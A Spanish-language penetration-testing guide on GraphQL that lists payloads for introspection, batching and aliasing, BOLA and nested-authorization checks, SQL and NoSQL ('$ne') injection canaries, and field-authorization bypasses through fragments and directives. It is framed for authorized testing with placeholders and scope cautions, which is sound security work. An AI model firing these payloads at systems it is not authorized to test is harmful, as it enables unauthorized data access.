# 🗡️ GraphQL: introspección, inyección y autorización: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### Puntos de entrada y consulta mínima

```text
GET /graphql?query=%7B__typename%7D
POST /graphql  {"query":"{__typename}"}
POST /api/graphql  {"query":"{__typename}"}
```

**Cuándo usarlo:** Son patrones de ruta; usar solo el endpoint descubierto en alcance. __typename por sí solo no es fallo.

**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection).


### Introspección acotada

```graphql
{ __schema { queryType { name } mutationType { name } } }
{ __type(name:"User") { name fields { name } } }
```

**Cuándo usarlo:** Son dos consultas alternativas. Requieren introspección habilitada y un tipo User real.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/graphql).


## 🧭 Payloads por contexto

### Variables, alias y fragmentos

```graphql
query($id:ID!) { node(id:$id) { id } }
query { a: viewer { id } b: viewer { id } }
query { viewer { ...F } } fragment F on User { id privateEmail }
```

**Cuándo usarlo:** Adaptar esquema. Autorización debe aplicarse por objeto/campo aunque cambie la forma de consulta.

**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection).


## 🔥 Payloads avanzados

### Dos operaciones en un lote pequeño

```text
[{"query":"{__typename}"},{"query":"{__typename}"}]
query { a: search(q:"canary-A"){id} b: search(q:"canary-B"){id} }
```

**Cuándo usarlo:** Primera línea: lote JSON solo si el servidor acepta batching. Segunda: una consulta con dos alias, adaptada al esquema. Comparar cuota y permisos por operación sin aumentar la carga.

**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection).


## 🔬 Pruebas guiadas por escenario

### 1. Endpoint GET

**Objetivo:** Comprobar si el servicio acepta query por URL.

```http
GET /graphql?query=%7B__typename%7D HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** `__typename` muestra que GraphQL responde; no es una vulnerabilidad.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md).

### 2. Introspección mínima

**Objetivo:** Conocer nombre de tipo raíz sin volcar todo el esquema.

```json
{"query":"{__schema{queryType{name}mutationType{name}}}"}
```

**Interpretación:** Introspección habilitada es inventario; el hallazgo requiere un resolver inseguro o datos sensibles.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/graphql).

### 3. Tipo específico

**Objetivo:** Consultar los campos de un tipo conocido del esquema.

```json
{"query":"{__type(name:\"User\"){name fields{name type{name kind}}}}"}
```

**Interpretación:** Requiere que el tipo exista; respetar límites de consulta del programa.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md).

### 4. Sugerencias por error

**Objetivo:** Obtener una pista de campo sin introspección completa.

```json
{"query":"{nombrEInexistente}"}
```

**Interpretación:** Una sugerencia de nombre no equivale a fuga sensible. No usar fuerza bruta masiva.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/graphql).

### 5. BOLA por node ID

**Objetivo:** Comparar acceso a objetos propios de cuentas A y B.

```json
{"query":"query($id:ID!){node(id:$id){id ... on Document { privateNote }}}","variables":{"id":"{ID_CONTROLADO_B}"}}
```

**Interpretación:** Adaptar Document/privateNote al esquema. Con token A, leer la nota privada creada por B confirma control roto; el ID por sí solo no basta.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/graphql).

### 6. Relación anidada

**Objetivo:** Probar autorización en campos hijo, no solo raíz.

```graphql
query { project(id:"{PROYECTO_PROPIO}") { id documents { id owner { id } } } }
```

**Interpretación:** Revisar si algún documento de B aparece por una relación accesible a A.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md).

### 7. Aliasing limitado

**Objetivo:** Medir si dos resolvers costosos comparten presupuesto por solicitud.

```graphql
query { a: search(q:"canary-A"){id} b: search(q:"canary-B"){id} }
```

**Interpretación:** Solo dos alias de prueba. Respuestas duplicadas no implican bypass de rate limit sin medir el contador.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/graphql).

### 8. Batch JSON de dos queries

**Objetivo:** Verificar si el endpoint procesa listas de operaciones.

```json
[{"query":"{__typename}"},{"query":"{__typename}"}]
```

**Interpretación:** Una API puede aceptar batching legítimamente; comprobar cuota y permisos por operación.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md).

### 9. Argumento SQL como canary

**Objetivo:** Probar si un resolver concatena un parámetro en SQL.

```json
{"query":"query($q:String!){search(q:$q){id}}","variables":{"q":"canary'"}}
```

**Interpretación:** Solo si `search` existe; un error GraphQL de validación no demuestra SQLi de backend.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md).

### 10. Variable JSON hacia NoSQL

**Objetivo:** Comprobar operadores cuando el esquema permite scalar JSON.

```json
{"query":"query($f:JSON){search(filter:$f){id}}","variables":{"f":{"name":{"$ne":"canary-inexistente"}}}}
```

**Interpretación:** Requiere scalar flexible y resolver NoSQL; comparar con valor literal y registros propios.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md).

### 11. Mutación con rol bajo

**Objetivo:** Comprobar política de función en una mutación reversible.

```graphql
mutation { updateOwnTestObject(id:"{ID_PROPIO}", name:"canary-{NONCE}") { id name } }
```

**Interpretación:** Comparar con política del rol. La mutación de ejemplo debe adaptarse al esquema real.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/graphql).

### 12. Fragmento sobre tipo sensible

**Objetivo:** Comprobar autorización de campos al recuperarlos mediante fragmento.

```graphql
query { viewer { ...CamposDePrueba } } fragment CamposDePrueba on User { id privateEmail }
```

**Interpretación:** Adaptar User y privateEmail al esquema. El resolver debe aplicar la misma política que en consulta directa.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/graphql).

### 13. Variable include

**Objetivo:** Comprobar que una directiva no evita la autorización de campo.

```json
{"query":"query($ver:Boolean!){viewer{id privateEmail @include(if:$ver)}}","variables":{"ver":true}}
```

**Interpretación:** El campo debe protegerse por rol aun cuando una variable controle su presencia.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
